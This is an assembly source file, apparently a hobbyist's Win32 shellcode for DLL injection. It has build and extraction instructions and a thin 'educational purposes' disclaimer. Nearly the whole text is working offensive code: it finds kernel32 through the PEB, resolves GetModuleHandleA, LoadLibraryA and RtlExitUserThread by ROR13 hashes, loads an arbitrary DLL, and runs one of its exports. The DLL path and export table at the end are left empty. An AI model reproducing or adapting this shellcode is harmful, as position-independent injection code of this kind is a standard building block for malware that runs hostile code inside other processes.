;    +++[ kirikou.asm by h4lf-jiffie (dohmatob elvis dopgima): a smart win32 DLL-injector ]+++
; Tested OK on 7 and xp

; /!\ This is for educational purposes only, ripped straight-outta my daily ramblings. But that's besides the point ..

; HOWTO:
;    0]-- Compile with 'nasm -f bin -o kirikou.bin kirikou.asm'
;    1]-- Use some opcode wizard to extract the generated shellcode. I use PYHTON.
;         Viz, 'shellcode = open("kirikou.bin", "rb").read()'. You have the fire!

; 4CKNOWLEDGEMENT5:
; 0]-- http://www.projectshellcode.com
; 1]-- HARMONY SECURITY (http://blog.harmonysecurity.com/2009_06_01_archive.html)
; 2]-- http://www.infond.fr/2009/09/tutoriel-initiation-aux-shellcodes.html      
; 3]-- phr4ck Issue 0x3e by sk <sk at scan-associates d0t net>

[SECTION .text]

; set the code to be 32-bit
; Tip: If you don't have this line in more complex shellcode,
;    the resulting instructions may end up being different to
;    what you were expecting.
BITS 32

global _start

_start:

get_kernel32:
    mov         edx,[fs:0x30]	; get a pointer to the PEB, at an offset of 48 bytes in the current TEB
    mov         edx,[edx + 0xC] ; get PEB->Ldr, at an offset of 2+1+1+2*4 = 12 bytes in the PEB
    mov         edx,[edx + 0x14]; get PEB->Ldr.InMemoryOrderModuleList.Flink (1st entry), at an offset of
                                ; 8+3*4 = 20 bytes from PEB->Ldr
    mov         edx,[edx]       ; get the next entry (2nd entry)
    mov         edx,[edx]	; get the next entry (3rd entry)
    mov         edx,[edx + 0x10]; get the 3rd entry's base address (kernel32.dll), at an offset of
                                ; 2*4+2*4 = 16 bytes from the entry's starting point
    
load_useful_kernel32dll_APIs:
    call        get_kernel32dll_API_hashtable
    pop 	esi	       
    xor         ecx,ecx
    mov         cl,0x2
    call	load_APIs
    
load_useful_ntdll_APIs:
    call        get_kernel32dll_API_hashtable
    pop         edi
    call        get_ntdll_API_hashtable
    call        [edi]           ; GetModuleHandleA("ntdll.dll")
    push        eax             ; save
    call        get_ntdll_API_hashtable
    pop 	esi
    call        goto_zero
    lodsb
    xor         ecx,ecx
    mov         cl,al
    pop         eax             ; restore
    mov         edx,eax
    call	load_APIs
   
dll_business:
    call        get_kernel32dll_API_hashtable
    pop         edi
    call        get_dll_API_hashtable
    call        [edi]           ; GetModuleHandleA(dll path)
    test        eax,eax
    jnz         after_loading_dll
    
load_dll:
    call        get_kernel32dll_API_hashtable
    pop         edi
    call        get_dll_API_hashtable
    call        [edi+0x4]       ; LoadLibraryA(dll path)
    test        eax,eax
    jz          error
    
after_loading_dll:
    mov         edx,eax
    call        load_useful_dll_APIs
    call        get_dll_API_hashtable
    pop         esi
    call        goto_zero
    lodsb
    test        al,al
    jz          quit
    mov         eax,[esi]
    test        eax,eax
    jz          error
    call        eax
    jmp         quit

error:
				; this is just a stub
    nop
    jmp		quit
   
quit:
    call        get_ntdll_API_hashtable
    pop         esi
    call        goto_zero
    lodsb
    push        0x0
    call        [esi]           ; RtlExitUserThread(0x0)
    
load_useful_dll_APIs:
    call        get_dll_API_hashtable
    pop 	esi
    call        goto_zero
    lodsb
    xor         ecx,ecx
    mov         cl,al
    call	load_APIs
    ret
    
find_API:
                                 ;================ INTERFACE ================
                                 ;@description: finds a named API in a DLL
                                 ;INPUT:
                                 ;1]-- edx = base address of DLL
                                 ;2]-- edi = pointer to sought-for  API hash
                                 ;OUTPUT:
                                 ;When I return, eax contains the address of 
                                 ;the sought-for API (zero if API not found)
                                 ;===========================================
                                
get_export_directory_table:
    mov         ebx,[edx + 0x3c]; ebx = offset of PE signature in kernel32.dll
    mov         ebx,[edx + ebx + 0x78]
				; ebx = offset of Export Directory Table in kernel32.dll
    add         ebx,edx         ; ebx = adress of Export Directory Table
    mov         ecx,[ebx+0x18]  ; ecx = nb of exported APIs (counter)
    mov         eax,[ebx+0x20]  ; eax = offset of Export Name Pointer Table in kernel2.dll
    add         eax,edx         ; eax = address of Export Name Pointer Table

find_API_loop:
    jecxz       API_notfound
    dec         ecx             ; next API index
    mov         esi,[eax+ecx*4] ; esi = ordinal of 'APIName\n' in Name Pointer Table
    add         esi,edx         ; esi = adress of 'APIName\n' in Name Pointer Table
    push        ecx             ; save
    push        eax             ; save
    push        edi             ; save
    call        compute_hash
    pop         edi             ; restore
    xor         eax,[edi]
    test        eax,eax
    pop         eax             ; restore
    pop         ecx             ; restore
    jnz         find_API_loop
    mov         eax,[ebx+0x24]  ; eax = offset Ordinal Table in kernel32.dll
    add         eax,edx         ; eax = adresse Ordinal Table
    mov         cx, [eax+ecx*2] ; cx = API ordinal - first ordinal
    mov         ax,[ebx+0x10]   ; eax = first ordinal in the table table
    add         cx,ax           ; cx = ordinal de la API
    dec         cx              ; to fall just in-phase (ordinal starts at 0)
    mov         eax,[ebx+0x1c]  ; eax = offset Export Address Table
    add         eax,edx         ; eax = adress of Export Address Table
    mov         eax,[eax+ecx*4] ; eax = offset of GetProcAddress kernel32.dll
    add         eax,edx 	; eax = adress of GetProcAddress API
    jmp         find_API_finished
    
API_notfound:
    xor         eax,eax
    
find_API_finished:
    ret
                                
compute_hash:
                                ; ================================== INTERFACE =================================
                                ; @description: given a string litteral (API name, etc.), computes a 4-byte hash
                                ; INPUT:
                                ; 0]-- esi should point to the string whose hash you wish to compute
                                ; OUTPUT:
                                ; When function returns, eax register contains 4-byte hash of the input string
                                ; ==============================================================================
    xor         edi,edi
    xor         eax,eax
    cld

compute_hash_loop:
    lodsb
    test        al,al
    jz          compute_hash_done
    or          al,0x60
    add         edi,eax
    ror         edi,0xD
    jmp         compute_hash_loop
   
compute_hash_done:
    mov         eax,edi        
    ret
                                
load_APIs:
                                ; ================================== INTERFACE ==================================
                                ; @description: loads a bunch of APIs from a DLL
                                ; INPUT:
                                ; 0]-- edx should be set to the address of the DLL from which we'll load the APIs
                                ; 1]-- esi should point to hash-table of names of APIs to load 
                                ; 2]-- ecx = number of APIs to load
                                ;
                                ; OUTPUT:
                                ; we'll progressively overwrite the hash entries with the addresses of the API as
                                ; we load them along
                                ; ===============================================================================
    mov         edi,esi
    
load_next_API:
    jecxz       load_APIs_end
    push        ecx             ; save
    push        esi             ; save
    push        edi             ; save
    mov         edi,esi         ; edi
    call        find_API
    pop         edi             ; restore
    stosd
    pop         esi             ; restore
    add         esi,0x4
    pop         ecx             ; restore
    loop       load_next_API

load_APIs_end:
    ret				; j ==> [edi - 4*j], for j = 1,2,.., maps (LIFO) the addresses of the loaded APIs
    
goto_zero:
    lodsb
    test        al,al
    jnz         goto_zero
    ret
    
get_kernel32dll_API_hashtable:
    pop		esi
    call        esi
    db 0x92                     ; GetModuleHandleA
    db 0x9D
    db 0x46
    db 0x59                     
    db 0x72                     ; LoadLibraryA
    db 0x62
    db 0x77
    db 0x95
    
get_ntdll_API_hashtable:
    pop         esi
    call        esi
    db "ntdll.dll"
    db 0x0
    db 0x1
    db 0x00                     ; RtlExitUserThread
    db 0x7D
    db 0x58
    db 0x31
    
get_dll_API_hashtable:
    pop         esi
    call        esi
    
    
    
;zthe_end:

; (c) h4lf-jiffie (gmdopp@gmail.com)




